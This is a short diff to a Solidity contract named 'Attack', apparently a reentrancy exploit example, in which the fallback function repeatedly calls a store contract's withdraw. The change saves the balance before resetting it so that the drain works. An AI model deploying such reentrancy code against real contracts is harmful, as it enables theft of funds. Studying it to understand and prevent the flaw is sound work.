@@ -15,11 +15,14 @@ contract Attack {
     //fallback function triggers when msg.sender.call is executed
     function() external payable {
         if (balance > 0) {
+            //store balance information
+            uint256 oldBalance = balance;
+            
             //reset balance to 0
             balance = 0;
             
             //withdraw the rest of the money if user balance is greater than 0
-            store.withdraw(balance ether);
+            store.withdraw(oldBalance ether);
         }
     }
 
